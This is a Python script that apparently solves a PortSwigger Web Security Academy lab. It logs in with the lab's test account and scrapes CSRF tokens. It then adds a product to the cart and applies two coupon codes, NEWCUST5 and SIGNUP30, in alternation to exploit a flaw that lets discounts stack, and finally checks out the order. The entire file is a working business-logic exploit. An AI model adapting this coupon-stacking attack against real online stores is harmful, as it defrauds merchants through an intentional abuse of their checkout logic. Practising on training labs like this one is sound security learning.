import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
cart_url = burp_url + '/cart'
kupon_url = burp_url + '/cart/coupon'
session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
burp_data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
session.post(cart_url, data=burp_data)

response = session.get(cart_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data_1 = {"csrf": csrf, "coupon": "NEWCUST5"}
burp_data_2 = {"csrf": csrf, "coupon": "SIGNUP30"}
session.post(kupon_url, data=burp_data_1)
session.post(kupon_url, data=burp_data_2)
session.post(kupon_url, data=burp_data_1)
session.post(kupon_url, data=burp_data_2)
session.post(kupon_url, data=burp_data_1)
session.post(kupon_url, data=burp_data_2)
session.post(kupon_url, data=burp_data_1)
session.post(kupon_url, data=burp_data_2)
response = session.get(cart_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)
burp_data = {"csrf": csrf}
session.post(burp_url+'/cart/checkout',burp_data)
